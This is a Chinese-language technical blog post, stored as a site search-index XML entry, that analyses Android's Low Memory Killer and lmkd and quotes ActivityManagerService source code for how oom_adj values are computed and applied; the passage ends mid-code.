<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Android-Low memory killer源码分析</title>
      <link href="/2022/05/14/LMK/"/>
      <url>/2022/05/14/LMK/</url>
      
        <content type="html"><![CDATA[<p>LMK 调研</p><span id="more"></span><h1 id="一-目标"><a class="markdownIt-Anchor" href="#一-目标">#</a> 一、目标</h1><p>​主要分析 Andoird 核心机制与服务中的 ——LMK 机制，低内存管理机制（根据需要杀死进程来释放需要的内存）。源码分析主要通过 http://androidxref.com/，Android 版本为 Marshmallow-Android 6.0.1_r10, 内核版本为 3.18，机制架构如下：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205141101950.png" alt="image-20220514110126445"></p><p>源码位置如下：</p><table><thead><tr><th>源代码名称</th><th>路径位置</th></tr></thead><tbody><tr><td>lowmemorykiller.c</td><td>/drivers/staging/android/lowmemorykiller.c</td></tr><tr><td>lmkd.c</td><td>/system/core/lmkd/lmkd.c</td></tr><tr><td>ProcessList.java</td><td>/frameworks/base/services/core/java/com/android/server/am/ProcessList.java</td></tr><tr><td>ActivityManagerService.java</td><td>/frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</td></tr></tbody></table><h1 id="二-核心服务原理分析"><a class="markdownIt-Anchor" href="#二-核心服务原理分析">#</a> 二、核心服务原理分析</h1><h2 id="一-lmk简介"><a class="markdownIt-Anchor" href="#一-lmk简介">#</a> （一） LMK 简介</h2><p>为了防止剩余内存过低，Android 在内核空间采用 <code>LMK(Low Memory Killer)</code>  机制，LMK 是通过注册 shrinker 来触发低内存回收的，但是这个机制可能会拖慢 Shrinkers 内存扫描速度，已从内核 4.12 中移除，后续会采用用户空间的 LMKD + memory cgroups 机制。</p><p>进程刚启动时，ADJ 等于 INVALID_ADJ，当执行完 attachApplication ()，该进程的 curAdj 和 setAdj 不相等，则会触发执行 setOomAdj () 将该进程的节点 /proc/pid/oom_score_adj 写入 oomadj 的值。下图参数为 Android 原生阈值，当系统剩余空闲内存抵御某阈值（比如 147MB），则从 ADJ 大于或等于相应阈值（比如 900）的进程中，选择 ADJ 值最大的进程，如果存在多个 ADJ 相同的进程，则选择内存最大的进程。如下是 64 位机器，LMK 默认阈值图：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205080957542.png" alt="img"></p><h2 id="二lmkd"><a class="markdownIt-Anchor" href="#二lmkd">#</a> （二）lmkd</h2><p>​ <code>lmkd</code> ，全称为 Low Memory Killer Daemon，用以监控正在运行的 Android 系统的内存) 状态，以及通过杀死最不重要进程来应对高内存压力，以保持系统在可接受的水平上运行。</p><p>过去，Android 使用内存 LMK 驱动程序来监控系统内存的压力，这是一种依赖于硬编码值的硬件机制。从 Kernel 4.12 开始，LMK 驱动程序从上游内核中移除，由应用空间的 lmkd 执行内存监控和进程终止任务。</p><p>Android 10 以及更高版本支持新的 lmkd 模式，它使用 PSI 监视器来检测内存压力。PSI  用以测量由于内存不足导致任务延迟的时间。由于这些岩石会直接影响到用户体验，因此它们代表了确定内存压力严重的便捷指标。PSI  监视器允许特权用户进程（例如 lmkd）指定这些延迟的阈值，然后订阅当突破阈值时来自 kernel 的事件。</p><h2 id="三原理分析"><a class="markdownIt-Anchor" href="#三原理分析">#</a> （三）原理分析</h2><p>​于 Linux 系统来说，底层内核的内存监控机制为 OOMKiller。一旦发现系统的可用内存达到临界值，OOM 的管理者就会自动回收内存。根据策略的不同，OOM 的处理手段略有差异。它的核心思想是按照优先级顺序，从低到高逐步杀掉进程，回收内存。优先级的设定策略一方面要考虑对系统的损害程度（例如系统的核心进程，优先级通常较高），另一方面也希望尽可能多地释放无用内存。一个合理的策略至少要综合一下几个因素：进程消耗的内存；进程占用的 CPU 时间；oom_adj（OOM 权重）。对于 Linux 内核中的 OOM Killer，内核所管理的进程都有一个衡量其 oom 权重的值，存储在 /proc/<PID>/oom_adj 中。根据这一权重值以及其他若干因素，系统会实时给每个进程评分，以决定 OOM 应该杀死哪些进程。比如 oom_score 分数越低的进程，杀死的概率越小，或者说被杀死的时间越晚。</p><p>对于 Android 系统来说，我们常常在使用的过程中从一个应用返回到桌面，然后再打开其他的应用进行使用。而此时前一个应用会驻留在内存中，当再次打开该应用时就可以直接显示使用。通过这种方法可以提升用户体验以及提高应用打开速度。但是系统内存是有限的，不可能一直将全部应用驻留在系统内存中。基于 Linux 内核 OOM Killer 的核心思想，Android 系统扩展出了自己的内存监控体系。因为 Linux 下的杀死内存要等到系统资源快要不够用的时候才会产生效果。而 Android 实现了不同梯级的 Killer，名为 Low Memory Killer（LMK）。所以 Low Memory Killer 的作用就是当内存处于低水平时，杀死系统中余留的暂时还不使用的进程，来释放内存。</p><p>我们知道，从 Zygote 中孵化出来的进程都会记录在 ActivityManagerService.mLruProcesses 列表中，ActivityManagerService 的核心业务之一就是实时更新进程的状态，根据状态计算出进程对应的 OomAdj 值，这个值会传递到 kernel 中，在 kernel 中有一个低内存回收机制，在内存达到一定阈值时会触发清理 OomAdj 值高的进程，这就是 LMK 的工作原理。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205141149506.jpeg" alt="img"></p><p>用户在启动一个进程之后，通常伴随着启动一个 Activity 游览页面或者一个 Service 播放音乐等等，这个时候此进程的 adj 被 AMS 提高，LMK 就不会杀死这个进程，当这个进程要做的事情做完了，退出后台了，此进程的 adj 很快又被 AMS 降低。当需要杀死一个进程释放内存时，一般先根据当前手机剩余内存的状态，在 minfree 节点中找到当前等级，再根据这个等级去 adj 节点中找到这个等级应该杀掉的进程的优先级， 之后遍历所有进程并比较进程优先级 adj 与优先级阈值，并杀死优先级低于阈值的进程，达到释放内存的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![img](https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205121659479.jpg) </span><br><span class="line"></span><br><span class="line">AMS负责了系统中四大组件的启动、切换、调度以及应用进程管理和调度工作。在应用程序的使用过程中，AMS会根据四大组件关键生命周期，在mLruProcesses中时时地设定对应进程的adj值（更新进程优先级），在内存低于阈值时，LMK会选择adj优先级最大（如果adj相等则选择同adj中内存占用最大）的进程杀掉，释放内存。</span><br><span class="line"></span><br><span class="line">总的来说，```Framework层通过调整adj的值和阈值数组，输送给kernel中的lmk，为lmk提供杀进程的原材料```，因为用户空间和内核空间相互隔离，就采用了文件节点进行通讯，用socket将adj的值与阈值数组传给lmkd(5.0之后不在由AMS直接与lmk通信，引入lmkd守护进程)，lmkd将这些值写到内核节点中。lmk通过读取这些节点，实现进程的kill。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 三、源代码分析</span><br><span class="line"></span><br><span class="line">## （一） ActivityManagerService.java</span><br><span class="line"></span><br><span class="line">### 1. updateConfiguration方法</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">public void updateConfiguration(Configuration values) &#123;</span><br><span class="line">        enforceCallingPermission(android.Manifest.permission.CHANGE_CONFIGURATION,</span><br><span class="line">                &quot;updateConfiguration()&quot;);</span><br><span class="line"></span><br><span class="line">        synchronized(this) &#123;</span><br><span class="line">            if (values == null &amp;&amp; mWindowManager != null) &#123;</span><br><span class="line">                values = mWindowManager.computeNewConfiguration();</span><br><span class="line">            &#125;</span><br><span class="line">            if (mWindowManager != null) &#123;</span><br><span class="line">                mProcessList.applyDisplaySize(mWindowManager);</span><br><span class="line">            &#125;</span><br><span class="line">            final long origId = Binder.clearCallingIdentity();</span><br><span class="line">            if (values != null) &#123;</span><br><span class="line">                Settings.System.clearConfiguration(values);</span><br><span class="line">            &#125;</span><br><span class="line">            updateConfigurationLocked(values, null, false, false);</span><br><span class="line">            Binder.restoreCallingIdentity(origId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里 updateConfiguration 是 ActivityManagerService (AMS) 对外提供的 binder 接口，调用后可以更新窗口的配置。</p><h3 id="2-applyoomadjlocked方法"><a class="markdownIt-Anchor" href="#2-applyoomadjlocked方法">#</a> 2. applyOomAdjLocked 方法</h3><p>2.1 applyOomAdjLocked 方法执行在 updateOomAdjLocked 中，最终通过它把 computeOomAdjLocked 和 updateOomAdjLocked 计算好的 adj 更新并保存。时序图如下：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205141614729.jpg" alt="img"></p><p>2.2 源码分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">applyOomAdjLocked</span><span class="params">(ProcessRecord app, <span class="type">boolean</span> doingAll, <span class="type">long</span> now,</span></span><br><span class="line"><span class="params">            <span class="type">long</span> nowElapsed)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (app.curRawAdj != app.setRawAdj) &#123;</span><br><span class="line">            app.setRawAdj = app.curRawAdj;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">changes</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//curAdj是computeOomAdjLocked计算出的adj值，赋值给setAdj，</span></span><br><span class="line">        <span class="comment">//并且调用ProcessList.setOomAdj方法        </span></span><br><span class="line">        <span class="keyword">if</span> (app.curAdj != app.setAdj) &#123;</span><br><span class="line">            ProcessList.setOomAdj(app.pid, app.info.uid, app.curAdj);</span><br><span class="line">            <span class="keyword">if</span> (DEBUG_SWITCH || DEBUG_OOM_ADJ) Slog.v(TAG_OOM_ADJ,</span><br><span class="line">                    <span class="string">&quot;Set &quot;</span> + app.pid + <span class="string">&quot; &quot;</span> + app.processName + <span class="string">&quot; adj &quot;</span> + app.curAdj + <span class="string">&quot;: &quot;</span></span><br><span class="line">                    + app.adjType);</span><br><span class="line">            app.setAdj = app.curAdj;</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//当schedGroup在ProcessList.SCHED_GROUP_TOP_APP跟非ProcessList.SCHED_GROUP_TOP_APP间切换时调用Process.setThreadPriority(int tid,int priority)，即应用进入前台和退出前台时改变UI相关线程优先级，这里的UI相关线程包括主线程和RenderThread，以提升用户界面的响应速度。</span></span><br><span class="line">        <span class="keyword">if</span> (app.setSchedGroup != app.curSchedGroup) &#123;</span><br><span class="line">            app.setSchedGroup = app.curSchedGroup;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG_SWITCH || DEBUG_OOM_ADJ) Slog.v(TAG_OOM_ADJ,</span><br><span class="line">                    <span class="string">&quot;Setting process group of &quot;</span> + app.processName</span><br><span class="line">                    + <span class="string">&quot; to &quot;</span> + app.curSchedGroup);</span><br><span class="line">            <span class="keyword">if</span> (app.waitingToKill != <span class="literal">null</span> &amp;&amp; app.curReceiver == <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; app.setSchedGroup == Process.THREAD_GROUP_BG_NONINTERACTIVE) &#123;</span><br><span class="line">                app.kill(app.waitingToKill, <span class="literal">true</span>);</span><br><span class="line">                success = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="type">long</span> <span class="variable">oldId</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Process.setProcessGroup(app.pid, app.curSchedGroup);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        Slog.w(TAG, <span class="string">&quot;Failed setting process group of &quot;</span> + app.pid</span><br><span class="line">                                + <span class="string">&quot; to &quot;</span> + app.curSchedGroup);</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        Binder.restoreCallingIdentity(oldId);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (app.thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            app.thread.setSchedulingGroup(app.curSchedGroup);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Process.setSwappiness(app.pid,</span><br><span class="line">                        app.curSchedGroup &lt;= Process.THREAD_GROUP_BG_NONINTERACTIVE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用了进程ApplicationThread的setProcessState方法</span></span><br><span class="line">        <span class="comment">//调用Process.setProcessGroup(int pid,int group)设置进程调度策略，native层代码原理就是利用linux的cgroup机制，将进程根据状态放入预先设定的cgroup分组中，这些分组包含了对cpu使用率、cpuset、cpu调频等子资源的配置，已满足特定状态进程对系统资源的需求。        </span></span><br><span class="line">        <span class="keyword">if</span> (app.repProcState != app.curProcState) &#123;</span><br><span class="line">            app.repProcState = app.curProcState;</span><br><span class="line">            changes |= ProcessChangeItem.CHANGE_PROCESS_STATE;</span><br><span class="line">            <span class="keyword">if</span> (app.thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="comment">//RuntimeException h = new RuntimeException(&quot;here&quot;);</span></span><br><span class="line">                        Slog.i(TAG, <span class="string">&quot;Sending new process state &quot;</span> + app.repProcState</span><br><span class="line">                                + <span class="string">&quot; to &quot;</span> + app <span class="comment">/*, h*/</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    app.thread.setProcessState(app.repProcState);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> success;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-updateoomadjlocked无参方法"><a class="markdownIt-Anchor" href="#3-updateoomadjlocked无参方法">#</a> 3. updateOomAdjLocked 无参方法</h3><p>updateOomAdjLocked 方法在应用进程的组件运行状态发生改变时被调用，比如有 Service 启动，有广播接收者收到广播，有 Activity 启动等。因为进程的重要性的计算就依赖于组件运行状态，既然组件运行状态发生了改变，就应该实时更新。</p><p>3.1 执行 oom 更新之前一些基本参数的初始化重置:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">updateOomAdjLocked</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">TOP_ACT</span> <span class="operator">=</span> resumedAppLocked(); <span class="comment">//获取当前</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ProcessRecord</span> <span class="variable">TOP_APP</span> <span class="operator">=</span> TOP_ACT != <span class="literal">null</span> ? TOP_ACT.app : <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> SystemClock.uptimeMillis(); <span class="comment">//系统开机不包括睡眠时间</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">nowElapsed</span> <span class="operator">=</span> SystemClock.elapsedRealtime(); <span class="comment">//系统开机时间</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">oldTime</span> <span class="operator">=</span> now - ProcessList.MAX_EMPTY_TIME; <span class="comment">//MAX_EMPTY_TIME是系统控制空进程能够保存的最大时间</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> mLruProcesses.size(); <span class="comment">//lru集合中进程的数量</span></span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    mAdjSeq++; <span class="comment">//记录执行该方法的次数</span></span><br><span class="line">    mNewNumServiceProcs = <span class="number">0</span>;</span><br><span class="line">    mNewNumAServiceProcs = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//系统默认CUR_MAX_EMPTY_PROCESSES=16,CUR_MAX_CACHED_PROCESSES=32</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">emptyProcessLimit</span> <span class="operator">=</span> mConstants.CUR_MAX_EMPTY_PROCESSES;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">cachedProcessLimit</span> <span class="operator">=</span> mConstants.CUR_MAX_CACHED_PROCESSES - emptyProcessLimit;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//将adj在900～906之间的进程分为numSlots部分</span></span><br><span class="line">    <span class="comment">//900～906只有7个数字可用，但是adj位于该范围的进程数量往往远远不只</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numSlots</span> <span class="operator">=</span> (ProcessList.CACHED_APP_MAX_ADJ</span><br><span class="line">            - ProcessList.CACHED_APP_MIN_ADJ + <span class="number">1</span>) / <span class="number">2</span>;<span class="comment">//=3</span></span><br><span class="line">    <span class="comment">//N = mNumNonCachedProcs + mNumCachedHiddenProcs + numEmptyProcs</span></span><br><span class="line">    <span class="comment">//lru集合的大小 = 非缓存进程+缓存进程+空进程</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numEmptyProcs</span> <span class="operator">=</span> N - mNumNonCachedProcs - mNumCachedHiddenProcs;</span><br><span class="line">    <span class="keyword">if</span> (numEmptyProcs &gt; cachedProcessLimit) &#123;</span><br><span class="line">        numEmptyProcs = cachedProcessLimit;<span class="comment">//保证空进程的数量在阈值内</span></span><br><span class="line">    &#125;</span><br><span class="line">    mEmptyRemainingCapacity = emptyProcessLimit - numEmptyProcs;<span class="comment">//空进程剩余的容量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">emptyFactor</span> <span class="operator">=</span> numEmptyProcs/numSlots;<span class="comment">//空进程的计算因子</span></span><br><span class="line">    <span class="keyword">if</span> (emptyFactor &lt; <span class="number">1</span>) emptyFactor = <span class="number">1</span>;<span class="comment">//保证最小为1</span></span><br><span class="line">    <span class="comment">//缓存进程的计算因子</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cachedFactor</span> <span class="operator">=</span> (mNumCachedHiddenProcs &gt; <span class="number">0</span> ? mNumCachedHiddenProcs : <span class="number">1</span>)/numSlots;</span><br><span class="line">    <span class="keyword">if</span> (cachedFactor &lt; <span class="number">1</span>) cachedFactor = <span class="number">1</span>;<span class="comment">//保证最小为1</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">stepCached</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//代表每一个slot的深度，下同</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">stepEmpty</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">numCached</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//缓存进程的数量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numEmpty</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//空进程的数量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numTrimming</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//重要性低于home的后台进程数量</span></span><br><span class="line">    <span class="comment">//以上的一些计算因子，都是动态变化的，会随着对应的进程数量变化，决定着每一个slot中进程的step</span></span><br><span class="line"> </span><br><span class="line">    mNumNonCachedProcs = <span class="number">0</span>;<span class="comment">//重设全局变量非缓存进程大小为0</span></span><br><span class="line">    mNumCachedHiddenProcs = <span class="number">0</span>;<span class="comment">//重设全局变量缓存进程大小为0</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> <span class="variable">curCachedAdj</span> <span class="operator">=</span> ProcessList.CACHED_APP_MIN_ADJ;<span class="comment">//在计算开始时，缓存进程的adj开始为900</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">nextCachedAdj</span> <span class="operator">=</span> curCachedAdj+<span class="number">1</span>;<span class="comment">//下一个为901</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">curEmptyAdj</span> <span class="operator">=</span> ProcessList.CACHED_APP_MIN_ADJ;<span class="comment">//在计算开始时，空进程的adj开始900</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">nextEmptyAdj</span> <span class="operator">=</span> curEmptyAdj+<span class="number">2</span>;<span class="comment">//下一个为902</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">retryCycles</span> <span class="operator">=</span> <span class="literal">false</span>;<span class="comment">//标记再次进行循环</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>3.2 调用 computeOomAdjLocked 方法计算进程的 oom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=N-<span class="number">1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">ProcessRecord</span> <span class="variable">app</span> <span class="operator">=</span> mLruProcesses.get(i);</span><br><span class="line">            <span class="keyword">if</span> (!app.killedByAm &amp;&amp; app.thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                app.procStateChanged = <span class="literal">false</span>;</span><br><span class="line">                <span class="comment">//计算app进程的adj</span></span><br><span class="line">                computeOomAdjLocked(app, ProcessList.UNKNOWN_ADJ, TOP_APP, <span class="literal">true</span>, now);</span><br><span class="line">                <span class="comment">//当执行完computeOomAdjLocked之后，对于缓存进程和空进程的app，如果发现还未进行adj设置，需要修改成正确的adj值</span></span><br><span class="line">                <span class="keyword">if</span> (app.curAdj &gt;= ProcessList.UNKNOWN_ADJ) &#123;</span><br><span class="line">                    <span class="keyword">switch</span> (app.curProcState) &#123;</span><br><span class="line">                        <span class="keyword">case</span> ActivityManager.PROCESS_STATE_CACHED_ACTIVITY:</span><br><span class="line">                        <span class="keyword">case</span> ActivityManager.PROCESS_STATE_CACHED_ACTIVITY_CLIENT:</span><br><span class="line">                        <span class="keyword">case</span> ActivityManager.PROCESS_STATE_CACHED_RECENT:</span><br><span class="line">                            <span class="comment">//处理缓存进程</span></span><br><span class="line">                            app.curRawAdj = curCachedAdj;</span><br><span class="line">                            app.curAdj = app.modifyRawOomAdj(curCachedAdj);</span><br><span class="line">                            <span class="keyword">if</span> (DEBUG_LRU &amp;&amp; <span class="literal">false</span>) Slog.d(TAG_LRU, <span class="string">&quot;Assigning activity LRU #&quot;</span> + i  + <span class="string">&quot; adj: &quot;</span> + app.curAdj + <span class="string">&quot; (curCachedAdj=&quot;</span> + curCachedAdj + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (curCachedAdj != nextCachedAdj) &#123;</span><br><span class="line">                                stepCached++;</span><br><span class="line"><span class="comment">//从这部分逻辑可以看出stepCached应该是表示一个深度</span></span><br><span class="line">                                <span class="keyword">if</span> (stepCached &gt;= cachedFactor) &#123;<span class="comment">//cachedFactor用来表示每一个slot的最大深度</span></span><br><span class="line">                                    stepCached = <span class="number">0</span>;<span class="comment">//在一个slot内，他们的adj值是一样的</span></span><br><span class="line">                                    curCachedAdj = nextCachedAdj;<span class="comment">//下一个slot的adj值</span></span><br><span class="line">                                    nextCachedAdj += <span class="number">2</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (nextCachedAdj &gt; ProcessList.CACHED_APP_MAX_ADJ) &#123;</span><br><span class="line">                                        <span class="comment">//保证缓存进程和空进程的adj在900～906之间</span></span><br><span class="line">                                        nextCachedAdj = ProcessList.CACHED_APP_MAX_ADJ;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:<span class="comment">//处理空进程</span></span><br><span class="line">                            app.curRawAdj = curEmptyAdj;</span><br><span class="line">                            app.curAdj = app.modifyRawOomAdj(curEmptyAdj);</span><br><span class="line">                            ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cycle strategy:循环策略</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">cycleCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (retryCycles) &#123;</span><br><span class="line">            cycleCount++;</span><br><span class="line">            retryCycles = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">                <span class="type">ProcessRecord</span> <span class="variable">app</span> <span class="operator">=</span> mLruProcesses.get(i);</span><br><span class="line">                <span class="keyword">if</span> (!app.killedByAm &amp;&amp; app.thread != <span class="literal">null</span> &amp;&amp; app.containsCycle == <span class="literal">true</span>) &#123;</span><br><span class="line">                    app.adjSeq--;</span><br><span class="line">                    app.completedAdjSeq--;</span><br><span 